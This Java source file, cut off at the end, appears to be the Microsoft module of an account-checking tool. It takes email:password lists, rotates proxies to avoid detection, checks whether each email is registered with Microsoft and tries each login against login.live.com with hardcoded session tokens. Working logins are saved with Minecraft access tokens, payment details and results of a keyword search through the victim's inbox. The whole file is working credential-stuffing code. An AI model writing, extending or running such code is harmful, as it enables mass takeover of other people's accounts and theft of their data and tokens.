package SerendipityAIOChecker.checker.Microsoft;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import SerendipityAIOChecker.checker.CUI.CUI;
import SerendipityAIOChecker.checker.GUI.CheckerGUI;
import SerendipityAIOChecker.checker.GUI.Message;
import SerendipityAIOChecker.checker.Proxy.ProxyTester;
import org.jsoup.Connection;
import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.SocketTimeoutException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.lang.Thread.sleep;

public class Microsoft {


    public static final Lock lock = new ReentrantLock();
    private static final String Module = "Microsoft Module";
    private static final Set<String> combosss = new HashSet<>();
    public static List<String> microsoftChecker_GoodProxies = new ArrayList<>();
    public static boolean enableAPIProxy = false;
    public static int apiProxiesRetryTimes = 1;
    public static List<String> proxies1 = new ArrayList<>();
    public static boolean showUpdateProxiesMessages = false;
    public static int microsoftChecker_process = 0;
    public static int microsoftChecker_tfa = 0;
    public static int microsoftChecker_hits = 0;
    public static int microsoftChecker_hasMC = 0;
    public static int microsoftChecker_superHits = 0;
    public static int microsoftChecker_bad = 0;
    public static int microsoftChecker_cpm = 0;
    public static int microsoftChecker_combo = 0;
    public static int minProxiesPool = 1;
    public static int microsoftChecker_vmbad = 0;
    public static int microsoftChecker_vmhits = 0;
    public static boolean microsoftCheckerDoneWork = false;
    public static int microsoftChecker_vmUnknown = 0;
    public static int microsoftChecker_ProxiesErrors = 0;
    public static int minGoodProxiesPool = 1;
    public static boolean Show2FA = false;
    public static boolean ShowBad = false;
    public static boolean onlyCheckMicrosoftEmailDomain = false;
    public static boolean enableInboxSearcher = false;
    public static String searchKeyword = null;
    public static int checkerThreads;
    public static int vmCheckerThreads;
    public static boolean enableVmChecker = false;
    public static int microsoftCheckerTimeout = 6000;
    public static boolean enableCheckMinecraft = false;
    public static boolean enableProxiesChecker = false;
    public static int proxiesRefreshTime = 40;
    private static String time;
    private static boolean enableGUI = false;
    public static ArrayBlockingQueue<String> queue;
    public static int iii = 0;
    public static int microsoftChecker_blocked = 0;
    public static int inboxSearcherRetries = 3;
    public static int paymentsCheckerRetries = 3;
    public static boolean saveBlockedCombos = false;
    public static boolean save2FAs = false;
    public static  int originalCombos = 0;
    public static boolean enableHighAccuracy = false;
    public static int microsoftUnknown  = 0;
    public static  boolean saveLowAccuracyUnknown = false;
    public static void updateConsoleTitle() {
        String title;
        String s;
        if (enableHighAccuracy){
            s = "| |Blocked:" + microsoftChecker_blocked + "| |Unknown:" + microsoftUnknown;
        }else {
            s = "| |Unknown:" + microsoftUnknown;
        }
        if (enableProxiesChecker) {
            if (enableCheckMinecraft) {
                title = CUI.title + "->Microsoft Checker|Hits:" + microsoftChecker_hits + "| |MCHits:" + microsoftChecker_hasMC + "| |2FA:" + microsoftChecker_tfa + s+
                        "| |Bad:" + microsoftChecker_bad + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                        "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + ProxyTester.proxies.size()
                        + "| |CPM:" + microsoftChecker_cpm + "| |ProxiesErrors:" + microsoftChecker_ProxiesErrors;
            } else {
                title = CUI.title + "->Microsoft Checker|Hits:" + microsoftChecker_hits + "| |2FA:" + microsoftChecker_tfa +s+
                        "| |Bad:" + microsoftChecker_bad + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                        "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + ProxyTester.proxies.size()
                        + "| |CPM:" + microsoftChecker_cpm + "| |ProxiesErrors:" + microsoftChecker_ProxiesErrors;
            }
        } else if (enableCheckMinecraft){
            title = CUI.title + "->Microsoft Checker|Hits:" + microsoftChecker_hits + "| |MCHits:" + microsoftChecker_hasMC + "| |2FA:" + microsoftChecker_tfa +s+
                    "| |Bad:" + microsoftChecker_bad + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                    "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + proxies1.size()
                    + "| |CPM:" + microsoftChecker_cpm + "| |ProxiesErrors:" + microsoftChecker_ProxiesErrors;
        }else {
            title = CUI.title + "->Microsoft Checker|Hits:" + microsoftChecker_hits + "| |2FA:" + microsoftChecker_tfa +s+
                    "| |Bad:" + microsoftChecker_bad + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                    "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + proxies1.size()
                    + "| |CPM:" + microsoftChecker_cpm + "| |ProxiesErrors:" + microsoftChecker_ProxiesErrors;
        }
        System.out.print("\033]0;" + title + "\007");
        System.out.flush();
    }

    private static void updateConsoleTitle1() {
        String title;

        if (enableProxiesChecker) {
            title = CUI.title + "->Microsoft VM Checker|Registered:" + microsoftChecker_vmhits +
                    "| |UnRegistered:" + microsoftChecker_vmbad + "| |Unknown:" + microsoftChecker_vmUnknown + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                    "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + ProxyTester.proxies.size()
                    + "| |CPM:" + microsoftChecker_cpm;
        } else {
            title = CUI.title + "->Microsoft Checker|Hits:" + microsoftChecker_hits + "| |2FA:" + microsoftChecker_tfa +
                    "| |Bad:" + microsoftChecker_bad + "| |Process:" + microsoftChecker_process + "/" + microsoftChecker_combo +
                    "| |GoodProxies/Proxies:" + microsoftChecker_GoodProxies.size() + "/" + proxies1.size()
                    + "| |CPM:" + microsoftChecker_cpm + "| |ProxiesErrors:" + microsoftChecker_ProxiesErrors;
        }

        System.out.print("\033]0;" + title + "\007");
        System.out.flush();
    }

    private static void readConfig() {
        StringBuilder configInfo = new StringBuilder();
        try {
            try (BufferedReader reader = new BufferedReader(new FileReader("./configs/MicrosoftConfig.ini"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    configInfo.append(line).append("<>");
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                String[] configInfo1 = configInfo.toString().split("<>");
                for (String string : configInfo1) {
                    String[] strings = string.split("\\|");
                    switch (strings[0]) {
                        case "Threads" -> checkerThreads = Integer.parseInt(strings[1]);
                        case "VM Threads" -> vmCheckerThreads = Integer.parseInt(strings[1]);
                        case "Enable Inbox Searcher(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                enableInboxSearcher = true;
                            } else if (!strings[1].equals("N")) {
                                enableInboxSearcher = false;
                            }
                        }
                        case "Keywords" -> {
                            if (enableInboxSearcher) {
                                searchKeyword = strings[1];
                            }
                        }
                        case "Enable API To Get Proxies(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                enableAPIProxy = true;
                            } else if (!strings[1].equals("N")) {
                                enableAPIProxy = false;
                            }
                        }
                        case "Number Of Proxy Retries Using The API Obtained At Once" -> {
                            if (enableAPIProxy) {
                                apiProxiesRetryTimes = Integer.parseInt(strings[1]);
                            }
                        }
                        case "Show Proxies Update Messages(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                showUpdateProxiesMessages = true;
                            } else if (!strings[1].equals("N")) {
                                showUpdateProxiesMessages = false;
                            }
                        }
                        case "Show Bad(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                ShowBad = true;
                            } else if (!strings[1].equals("N")) {
                                ShowBad = false;
                            }
                        }
                        case "Show 2FA(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                Show2FA = true;
                            } else if (!strings[1].equals("N")) {
                                Show2FA = false;
                            }
                        }
                        case "Enable Only Check @live @outlook @hotmail(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                onlyCheckMicrosoftEmailDomain = true;
                            } else if (!strings[1].equals("N")) {
                                onlyCheckMicrosoftEmailDomain = false;
                            }
                        }
                        case "Enable VM Checker(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                enableVmChecker = true;
                            } else if (!strings[1].equals("N")) {
                                enableVmChecker = false;
                            }
                        }
                        case "Min Proxies Pool" -> minProxiesPool = Integer.parseInt(strings[1]);
                        case "Min Good Proxies Pool" -> minGoodProxiesPool = Integer.parseInt(strings[1]);
                        case "Microsoft Checker Connect Timeout" ->
                                microsoftCheckerTimeout = Integer.parseInt(strings[1]);
                        case "Enable Check Minecraft(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                enableCheckMinecraft = true;
                            } else if (!strings[1].equals("N")) {
                                enableCheckMinecraft = false;
                            }
                        }
                        case "Enable Proxies Checker(Contain Min (G)PP)(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                enableProxiesChecker = true;
                            } else if (!strings[1].equals("N")) {
                                enableProxiesChecker = false;
                            }
                        }
                        case "Refresh Proxies Pool Time(S)" -> proxiesRefreshTime = Integer.parseInt(strings[1]);
                        case "Inbox Searcher Retry Times" -> inboxSearcherRetries = Integer.parseInt(strings[1]);
                        case "Payments Checker Retry Times" -> paymentsCheckerRetries = Integer.parseInt(strings[1]);
                        case "Save Blocked Combos(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                saveBlockedCombos = true;
                            } else if (!strings[1].equals("N")) {
                                saveBlockedCombos = false;
                            }
                        }
                        case "Save 2FA(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                save2FAs = true;
                            } else if (!strings[1].equals("N")) {
                                save2FAs = false;
                            }
                        }
                        case "Accuracy Of Microsoft Checker(H/L)" ->{
                            if (strings[1].equals("H")) {
                                enableHighAccuracy = true;
                            } else if (!strings[1].equals("L")) {
                                enableHighAccuracy = false;
                            }
                        }
                        case "Save Low Accuracy Unknown(Y/N)" -> {
                            if (strings[1].equals("Y")) {
                                saveLowAccuracyUnknown = true;
                            } else if (!strings[1].equals("N")) {
                                saveLowAccuracyUnknown = false;
                            }
                        }
                    }
                }
            } catch (NumberFormatException e) {
                if (!enableGUI) {
                    System.out.println(CUI.ANSI_RED + "[WARNING]" + CUI.ANSI_YELLOW + "Check Your Config File!");
                } else {
                    System.out.println("[WARNING]" + "Check Your Config File!");
                }

                throw new RuntimeException(e);
            }


        } catch (NumberFormatException e) {
            if (enableGUI) {
                System.out.println(CUI.ANSI_RED + "[WARNING]" + CUI.ANSI_YELLOW + "Check Your Config File!");
            } else {
                System.out.println("[WARNING]" + "Check Your Config File!");
            }

            throw new RuntimeException(e);
        }
    }

    public static String time() {
        Date currentTime = new Date();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
        return simpleDateFormat.format(currentTime);
    }

    private static void checkerInfo() {
        try {
            if (!enableGUI) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            }
            System.out.println(CUI.ANSI_PURPLE + "[INFO]");
            System.out.println(CUI.ANSI_RED + CUI.title);
            System.out.println(CUI.ANSI_RESET + "Module:" + CUI.ANSI_RED + Module);
            if (enableVmChecker) {
                System.out.print(CUI.ANSI_RESET + "VM Threads:" + CUI.ANSI_RED + vmCheckerThreads);
                System.out.print(CUI.ANSI_RESET + " | ");
            } else {
                System.out.print(CUI.ANSI_RESET + "Threads:" + CUI.ANSI_RED + checkerThreads);
                System.out.print(CUI.ANSI_RESET + " | ");
                System.out.print(CUI.ANSI_RESET + "Enable Inbox Searcher:" + CUI.ANSI_RED + enableInboxSearcher);
                if (enableInboxSearcher) {
                    System.out.print(CUI.ANSI_RESET + " | ");
                    System.out.println(CUI.ANSI_RESET + "Search Keyword(s):" + CUI.ANSI_RED + searchKeyword);
                } else {
                    System.out.println();
                }
                System.out.print(CUI.ANSI_RESET + "Enable Proxies Checker:" + CUI.ANSI_RED + enableProxiesChecker);
                if (!enableProxiesChecker) {
                    System.out.print(CUI.ANSI_RESET + " | ");
                    System.out.println(CUI.ANSI_RESET + "Refresh Proxies Pool Time(S):" + CUI.ANSI_RED + proxiesRefreshTime);
                } else {
                    System.out.println();
                }
            }
            int cleanedCombos = originalCombos - microsoftChecker_combo;
            if (enableProxiesChecker) {
                System.out.println(CUI.ANSI_RESET + "Combos:" + CUI.ANSI_RED + microsoftChecker_combo + CUI.ANSI_RESET + " | " +
                        "Proxies:" + CUI.ANSI_RED + ProxyTester.proxies.size()
                        + CUI.ANSI_RESET + " | OriginalCombos:" + CUI.ANSI_RED + originalCombos
                        + CUI.ANSI_RESET + " | Cleaned Combos:" + CUI.ANSI_RED +cleanedCombos);
            } else {
                System.out.println(CUI.ANSI_RESET + "Combos:" + CUI.ANSI_RED + microsoftChecker_combo + CUI.ANSI_RESET + " | " +
                        "Proxies:" + CUI.ANSI_RED + proxies1.size()
                        + CUI.ANSI_RESET + " | OriginalCombos:" + CUI.ANSI_RED + originalCombos
                        + CUI.ANSI_RESET + " | Cleaned Combos:" + CUI.ANSI_RED +cleanedCombos);
            }


        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }


    public static void start() throws IOException, InterruptedException {
        enableGUI = CUI.enableGUI;
        microsoftCheckerDoneWork = false;
        readConfig();
        Message.show("Microsoft Checker");
        if (!enableGUI) {
            CUI.logo();
        }
        if (enableGUI & enableVmChecker) {
            CheckerGUI.isEnableVMCheckerLabel(true);
        } else if (enableGUI & !enableVmChecker) {
            CheckerGUI.isEnableVMCheckerLabel(false);
        }

        String filePath = "./files/Combos.txt";
        Set<String> combos = readCombos(filePath);
        if (enableAPIProxy) {
            ProxyTester.MicrosoftModule_UpdateProxiesAPIs();
            if (!enableProxiesChecker){
                ProxyTester.microsoftCheckerGetProxies();
            }
        } else {
            try {
                Microsoft.proxies1 = ProxyTester.readHttpProxiesFromFile();
                ProxyTester.configureProxies(proxies1, Proxy.Type.HTTP);
                Microsoft.proxies1 = ProxyTester.readSocksProxiesFromFile();
                ProxyTester.configureProxies(proxies1, Proxy.Type.SOCKS);
                Microsoft.proxies1.clear();
                Microsoft.proxies1.addAll(ProxyTester.proxies);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
        time = time();


        if (!enableVmChecker) {
            combosss.addAll(combos);
            combos.clear();
            microsoftChecker_combo = combosss.size();
        } else {
            microsoftChecker_combo = combos.size();
        }
        try {
            checkerInfo();
            getCPM();
            if (enableVmChecker) {
                System.out.println(CUI.ANSI_YELLOW + "[VM Checker] " + "|Email| " + " |UsedProxy|");
                ExecutorService executor1 = Executors.newFixedThreadPool(vmCheckerThreads);
                for (String testPoint : combos) {
                    executor1.execute(() -> {
                        try {
                            checkEmailIsRegistered(testPoint, false);
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    });
                }
                executor1.shutdown();
                executor1.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
            }
            if (enableVmChecker) {
                combos.clear();
                saveVmCheckedCombos();
                microsoftChecker_combo = combosss.size();
                microsoftChecker_process = 0;
                if (enableGUI & enableVmChecker) {
                    CheckerGUI.isEnableVMCheckerLabel(false);
                }
                enableVmChecker = false;
                checkerInfo();
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        ExecutorService executor = Executors.newFixedThreadPool(checkerThreads);
        if (enableCheckMinecraft) {
            System.out.println(CUI.ANSI_YELLOW + "[Normal Checker] " + "|HasMinecraft| " + "|Email| "
                    + "|Username| " + "|HypixelLevel| " + "|HypixelRanked| " + " |ArcadeCoins| " + "|UHCCoins| " + "|UHCKilleds| " + "|HasOptifineCape| "
                    + "|Payments| " + "|InboxResult| " + "|UsedProxy|");
        } else {
            System.out.println(CUI.ANSI_YELLOW + "[Normal Checker] " + "|Email| "
                    + "|Payments| " + "|InboxResult| " + "|UsedProxy|");
        }
        queue= new ArrayBlockingQueue<>(microsoftChecker_combo);
        queue.addAll(combosss);
        combosss.clear();
        microsoftChecker_combo = queue.size();
        createFolder(time + "/MicrosoftModule");
        while (microsoftChecker_process < microsoftChecker_combo){
            String combo = queue.take();
                executor.execute(() -> {
                        try {
                            String s = loginMicrosoft(combo);
                            if (s.equals("no")){
                                try {
                                    queue.put(combo);
                                } catch (InterruptedException e) {
                                    throw new RuntimeException(e);
                                }
                            }
                        }catch (org.jsoup.UncheckedIOException e){
                            try {
                                queue.put(combo);
                            } catch (InterruptedException e1) {
                                throw new RuntimeException(e1);
                            }
                        }
                });

        }
        executor.shutdown();
        executor.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
        microsoftCheckerDoneWork = true;
        System.out.println("Done Work!");
    }

    public static boolean checkRequirements(String input) {
        int numRequirementsMet = 0;

        if (input.matches(".*[A-Z].*")) {
            numRequirementsMet++;
        }
        if (input.matches(".*[a-z].*")) {
            numRequirementsMet++;
        }
        if (input.matches(".*\\d.*")) {
            numRequirementsMet++;
        }
        if (input.matches(".*[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>/?].*")) {
            numRequirementsMet++;
        }

        return numRequirementsMet >= 2;
    }

    private static void saveVmCheckedCombos() {
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter("./output/" + time + "/MicrosoftModule/VMCheckedOutput.txt"));
            for (String c : combosss) {
                writer.write(c);
                writer.newLine();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    private static void checkEmailIsRegistered(String combo, boolean retry) throws InterruptedException {
        String proxy = null;
        if (!enableGUI) {
            updateConsoleTitle1();
        } else {
            CheckerGUI.updateMicrosoftVMCheckerInfo();
        }


        String[] combo1 = combo.split(":");
        String Email;
        if (combo1.length == 2) {
            Email = combo1[0];
        } else {
            if (ShowBad) {
                System.out.println("Bad Combo Line!");
                System.out.println(combo);
            }
            return;
        }

        if (!ProxyTester.updatedProxies) {
            sleep(1000);
        }
        if (enableProxiesChecker) {
            if (microsoftChecker_GoodProxies.size() >= 3) {
                proxy = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else if (retry) {
                if (!microsoftChecker_GoodProxies.isEmpty()) {
                    proxy = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
                }
            } else {
                if (microsoftChecker_GoodProxies.size() > ProxyTester.proxies.size()) {
                    proxy = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
                } else {
                    proxy = ProxyTester.MicrosoftModule_GetRandomProxy(ProxyTester.proxies);
                }
            }
        } else {
            proxy = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }
        String[] proxy1;
        if (proxy != null) {
            proxy1 = proxy.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }

            checkEmailIsRegistered(combo, false);
            return;
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy3;
        if (proxy1.length == 3) {
            try {
                proxy3 = new Proxy(Proxy.Type.valueOf(proxy1[2]), new InetSocketAddress(proxy1[0], Integer.parseInt(proxy1[1])));
            } catch (IllegalArgumentException e) {
                if (enableProxiesChecker & !ProxyTester.proxies.isEmpty()) {
                    ProxyTester.proxies.remove(proxy);
                } else {
                    proxies1.remove(proxy);
                }
                checkEmailIsRegistered(combo, false);
                return;
            }
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy);
            } else {
                proxies1.remove(proxy);
            }

            checkEmailIsRegistered(combo, false);
            return;
        }
        if (proxy.isEmpty() || proxy.contains("null")) {
            try {
                checkEmailIsRegistered(combo, false);
                return;
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
        String ss;
        try {
            Connection connection1 = Jsoup.connect("https://login.live.com/GetCredentialType.srf?")
                    .header("Cookie", "uaid=989a6a1d1d454a5b9b462cbcad839f96; MSPOK=$uuid-3e61fdd3-6c25-4ff1-8bab-4911dd6fa7ef")
                    .method(Connection.Method.POST)
                    .proxy(proxy3)
                    .header("Content-type", "application/json")
                    .timeout(6000)
                    .ignoreContentType(true)
                    .requestBody("{\"username\":\"" + Email + "\",\"uaid\":\"989a6a1d1d454a5b9b462cbcad839f96\",\"isOtherIdpSupported\":false,\"checkPhones\":true,\"isRemoteNGCSupported\":true,\"isCookieBannerShown\":true,\"isFidoSupported\":true,\"forceotclogin\":false,\"otclogindisallowed\":false,\"isExternalFederationDisallowed\":false,\"isRemoteConnectSupported\":false,\"federationFlags\":3,\"isSignup\":false,\"flowToken\":\"-DT5VDPTuNiEylg6!mk84nzElwgiG4QhiMkIbpwVfny0W8hlcSPwEg*BE0VPFZSOPORcK9InC9fYEBa47jx0BI*j!gAQCxtcsPxMe92im*!CHCLavxmzKaU98lGgbEB31VJlT!C4y!QvXIcA8ceBWnlu40UmWzVDCw!9T7Vq8l!nLUuTuq7q!3J!JnmjeSM0XxA$$\"}");

            Connection.Response response1 = connection1.execute();
            ss = response1.body();
            String s = ProxyTester.extractStringBetween(ss, "\"IfExistsResult\":", ",");
            if (s != null && Integer.parseInt(s) == 2) {
                deleteProxy(proxy);

                checkEmailIsRegistered(combo, true);
            } else if (ss.contains("Credentials")) {
                ++microsoftChecker_vmhits;
                ++microsoftChecker_process;
                if (!microsoftChecker_GoodProxies.contains(proxy)){
                    microsoftChecker_GoodProxies.add(proxy);
                }
                System.out.println(CUI.ANSI_RESET + "[Registered]" + CUI.ANSI_GREEN + "[*]"
                        + CUI.ANSI_CYAN + " |" + Email + "|"
                        + CUI.ANSI_YELLOW + " |" + proxy + "|");
                combosss.add(combo);
            } else {
                ++microsoftChecker_vmbad;
                ++microsoftChecker_process;
                if (!microsoftChecker_GoodProxies.contains(proxy)){
                    microsoftChecker_GoodProxies.add(proxy);
                }
                deleteProxy(proxy);
                if (ShowBad) {
                    System.out.println(CUI.ANSI_RESET + "[Unregistered]" + CUI.ANSI_RED + "[!]"
                            + CUI.ANSI_CYAN + " |" + Email + "|"
                            + CUI.ANSI_YELLOW + " |" + proxy + "|");
                }
            }
        } catch (IOException | UncheckedIOException e) {
            if (e instanceof SocketTimeoutException) {
                info1(combo, proxy);
            } else if (e instanceof java.net.SocketException) {
                info1(combo, proxy);
            } else {
                info1(combo, proxy);
            }
        } catch (Exception e) {
            info1(combo, proxy);
        }

    }

    private static void info1(Object combo, String proxy) {
        microsoftChecker_vmUnknown++;
        ++microsoftChecker_process;
        deleteProxy(proxy);
        combosss.add(combo.toString());
    }


    private static void getCPM() {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        // ����һ��Runnable���񣬱�ʾ��Ҫִ�еĲ���
        Runnable task = () -> {
            try {
                int fristProcess = microsoftChecker_process;
                sleep(1000);
                microsoftChecker_cpm = (microsoftChecker_process - fristProcess) * 60;
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }

        };

        scheduler.scheduleAtFixedRate(task, 0, 1, TimeUnit.SECONDS);
        while (microsoftCheckerDoneWork) {
            scheduler.shutdown();
        }
    }

    public static void writeToFile(String filePath, String Payments,
                                   String Username, String combo, String HypixelLevel, String MinecraftAccessToken,
                                   String HypixelRanked, String inboxResult, String arcadeCoins, String uhcCoins, String uhcKills, String hasCape) {
        BufferedWriter writer = null;
        try {
            lock.lock();
            writer = new BufferedWriter(new FileWriter(filePath, true));
            if (filePath.contains("_Minecraft")) {
                writer.write("MinecraftUsername:" + Username + "  HypixelLevel:" + HypixelLevel + "  HypixelRanked:" + HypixelRanked);
                writer.newLine();
                writer.write("HasOptifineCape:" + hasCape + "  ArcadeCoins:" + arcadeCoins + "  UhcCoins:" + uhcCoins + "  UhcKills:" + uhcKills);
                writer.newLine();
                writer.write("Login Token:" + MinecraftAccessToken);
                writer.newLine();
            }
            writer.write(combo);
            writer.write("  Payments:" + Payments);
            writer.write("  InboxResult:" + inboxResult);
            writer.newLine();
            if (!Username.equals("N/A")) {
                writer.write("HEXHNB");
                writer.newLine();
            }
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            lock.unlock();
        }
    }
    public static void save(String combo,String type){
        BufferedWriter writer = null;
        try {
            lock.lock();
            switch (type) {
                case "2fa" ->
                        writer = new BufferedWriter(new FileWriter("./output/" + time + "/MicrosoftModule/Microsoft2FA.txt", true));
                case "blocked" ->
                        writer = new BufferedWriter(new FileWriter("./output/" + time + "/MicrosoftModule/MicrosoftBlocked.txt", true));
                case "unknown" ->
                        writer = new BufferedWriter(new FileWriter("./output/" + time + "/MicrosoftModule/Unknown.txt", true));
                default -> {
                    return;
                }
            }
            writer.write(combo);
            writer.newLine();
            writer.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }finally {
            if (writer != null){
                try {
                    writer.close();
                }catch (IOException e){
                    e.printStackTrace();
                }
            }
            lock.unlock();
        }
    }
    public static Set<String> readCombos(String filePath) {
        Set<String> lines = new HashSet<>();

        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                originalCombos++;
                String[] parts = line.split(":");
                if (onlyCheckMicrosoftEmailDomain) {
                    if (parts.length == 2 && parts[1].trim().length() >= 8 & checkRequirements(parts[1])) {
                        if (parts[0].contains("@live")) {
                            lines.add(line);
                        }
                        if (parts[0].contains("@outlook")) {
                            lines.add(line);
                        }
                        if (parts[0].contains("@hotmail")) {
                            lines.add(line);
                        }
                    }
                } else {
                    if (parts.length == 2 && parts[1].trim().length() >= 8 & checkRequirements(parts[1])) {
                        lines.add(line);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return lines;
    }

    public static void createFolder(String time) {
        File directory = new File("output/" + time);
        if (!directory.exists()) {
            directory.mkdirs();
        }
    }

    private static String loginMicrosoft(String combo) {
        if (!enableGUI) {
            updateConsoleTitle();
        } else {
            CheckerGUI.updateMicrosoftCheckerInfo();
        }
        String proxy;
        if (enableProxiesChecker) {
            if (microsoftChecker_GoodProxies.size() >= minGoodProxiesPool) {
                proxy = ProxyTester.MicrosoftModule_GetGoodProxy(microsoftChecker_GoodProxies);
            } else {
                proxy = ProxyTester.microsoftCheckerGetProxyAndCheckProxy(ProxyTester.proxies);
            }
        } else {
            proxy = ProxyTester.MicrosoftModule_GetRandomProxy(proxies1);
        }
        String[] proxy1;
        if (proxy != null) {
            proxy1 = proxy.trim().split(":");
        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(null);
            } else {
                proxies1.remove(null);
            }
            return "no";
        }
        ProxyTester.updatedProxies = true;
        Proxy proxy3;
        if (proxy1.length == 3) {
            proxy3 = new Proxy(Proxy.Type.valueOf(proxy1[2]), new InetSocketAddress(proxy1[0], Integer.parseInt(proxy1[1])));

        } else {
            if (enableProxiesChecker) {
                ProxyTester.proxies.remove(proxy);
            } else {
                proxies1.remove(proxy);
            }
            return "no";
        }
        String[] combo1 = combo.split(":");
        String Email;
        String Password;
        if (combo1.length != 2) {
            microsoftChecker_bad++;
            microsoftChecker_process++;
            if (ShowBad) {
                System.out.println("Bad Combo Line!");
                System.out.println(combo);
            }
            return "yes";
        } else {
            Email = combo1[0];
            Password = combo1[1];
        }
        try {
            Connection connection = Jsoup.connect("https://login.live.com/ppsecure/post.srf?contextid=004EDF3AC522A4D3&opid=9E210C77752BBE6B&bk=1690686907&uaid=f615a4d9973c49519f705fcd7bf92faf&pid=0")
                    .header("Cookie", "uaid=f615a4d9973c49519f705fcd7bf92faf; OParams=11O.DcjhOXYjxWmPmSk!uejxLEAMRVGLhTKpA4mjk0O*Oii*YRDHW6WcemZp3IR6ezi1jOG04JZmbnFU9z4Pw0*7KHqqQpyWc0DkkWJE3P8HujTMrRX74n1uPLhWiXPHXNNEOg$$; MSPOK=$uuid-52b04507-6e34-4ce3-b349-b5c4783ceab5$uuid-de9592d5-ac90-4e34-a92a-1cf8cee2a5f8$uuid-3fcbbfc1-0ea9-42b9-b7f7-1cc942cb4d54;")
                    .method(Connection.Method.POST)
                    .proxy(proxy3)
                    .timeout(microsoftCheckerTimeout)
                    .requestBody("i13=0&login=" + Email + "&loginfmt=" + Email + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + Password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DbJQwq7eLWvNK*aDx!43ZyNG6hVn7HCLR5FaK4Bd6R7oVkBdR9y11ip1S0S0YuwnRYlSelERQVR0P14y0RlFFK5bDiJpbgZ5ipb4xg11dCYzIh*YpRksoCrAZN*IM4Srio5sDAf9nH8WysmQc1zQB7G2hSGIe5y2K4trr6UQ7QCAyGTLIrS642vaoXtNDsDvzT!zKmrl2yri!17SyskAZpk$&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099");

            Connection.Response response = connection.execute();
            if (response.cookies().size() >= 2 & response.body().contains("AQ:null")) {
                ++microsoftChecker_ProxiesErrors;
                deleteProxy(proxy);
                return "no";
            } else if (response.cookies().size() >= 4 & response.body().contains("<link rel=\"preconnect\" href=\"https://acctcdn.msauth.net\" crossorigin>")) {
                if (response.body().contains("PROOF.Type")) {
                    ++microsoftChecker_tfa;
                    ++microsoftChecker_process;
                    if (enableCheckMinecraft & Show2FA) {
                        System.out.println(CUI.ANSI_DARK_WHITE + "[2FA]" + CUI.ANSI_BRIGHT_CYAN + "[?]" + CUI.ANSI_RED + " |FALSE|"
                                + CUI.ANSI_CYAN + " |" + Email + "| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A| |N/A|"
